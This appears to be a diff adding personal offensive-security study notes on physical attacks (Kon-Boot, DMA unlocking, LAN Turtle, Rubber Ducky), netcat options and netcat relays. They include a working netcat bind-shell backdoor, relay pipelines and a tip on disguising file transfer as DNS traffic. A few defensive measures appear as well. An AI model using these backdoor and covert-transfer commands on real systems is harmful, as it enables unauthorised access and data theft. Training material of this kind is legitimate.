@@ -1,0 +1,113 @@
+#------------#
+#   xploitz  #
+#------------#
+
+>PHYS.ATTKS
+>>NETCAT
+>>>RELAYS
+>>>>SNIFFING
+
+
+#-----PhysicalAttacks-----#
+
+
+Konboot: usbBoot attack > any pwd accepted
+>>>piotrbania[.]com/all/kon-boot
+
+Inception: unlock powered/locked pc via DMA firewire/thunderbolt juice
+>>>github/carmaa/inception
+
+LAN turtle: usb ether adapter creates DNS noise + Responder gets hashes
+Lanturtle[.]com
+
+RUBBER DUCKY -- Human interface device (HID) for kboard cmds via DUCKY script
+
+Use Full disk encryption - blocks Inception-style attacks
+Restrict W+X USB ports. Only R access (not full RWX)
+Pwd protect BIOS + disable USB boot
+Disable LLMNR (local lan Manager)
+
+#-----NETCAT-----#
+
+R+W data ax net
+→ can evade AV
+-data transfer (move files)
+-port+vuln scan
+-juice open ports
+-bd
+-relay
+<><>
+
+-l: This option tells the Netcat to be in listen mode
+-u: This shifts Netcat from TCP(default) to UDP mode
+-p: For the listener, this is the listened port. For the client, this is source port.
+-e: This is a very useful option. This tells what operation to perform after a successful connection.
+-L: This makes a persistent listener. Work for Windows only
+-wN: This option defines the timeout value. For example, w indicates to wait for 5 seconds before timeout.
+-v: This is the verbose mode.
+
+
+
+
+Nmap created a clone called Ncat
+--->SSL encryption (both client/listener)
+-----multiple clients:listener
+
+
+
+[[[Client Mode]]]
+NetCat allows only one client:listener
+--default in client mode
+
+***what is fragrouter***
+
+[[[Listen Mode]]]
+-waits for connections via port ( nc -l )
+-packets/traffic comes in via the screen (stdout=screen by default)
+-
+
+***PRO TIP: stealthy file transfer via UDP port 53 -- looks like regular DNS traffic***
+++PRO TIP: jus run /bin/sh or cmd.exe == already logged in as user who ran NC -l ++
+
+#------RELAYS------#
+
+1way juice street:
+
+Everything coming here | Now goes here
+
+Nc -l -p 1234 | nc dumbserver -p 4321
+
+***TIP: Netway only performs one cmd after -e, so put everything in .bat file to exe more***
+----put heavy cmds in batch file
+-----run one nc cmd tht executes the batch file which does more ++
+
+Create Relay via Win:
+Create a .bat file containing a cmd to start nc client (nc 10.2.3.90 53)
+Create relay (nc -l -p 1234 -e test.bat)
+
+Create Relay via Unix:
+Mknod backpipe p (creates FIFO filetype to carry data b/forth)
+Nc -l -p 1234 0<backpipe | nc next_hop 4321 1>backpipe
+
+Tip: Mknod backpipe p (old unix sys)
+------Mkfifo backpipe (new unix sys)
+
+
+hxxps://mk0resourcesinfm536w.kinstacdn.com/wp-content/uploads/062115_2318_NetcatUses1.png
+
+
+Netcat bd w/o -e 
+
+/bin/bash 0<backpipe | nc -l -p 8080 1>backpipe
+
+
+[PICERL]: know ways running on ur sys + close unused ports + patch + DinDepth
+
+Useful for *Gcat + Meterpreter*
+
+*lab*
+
+B3.Pg23
+
+
+#----SNIFFING----#
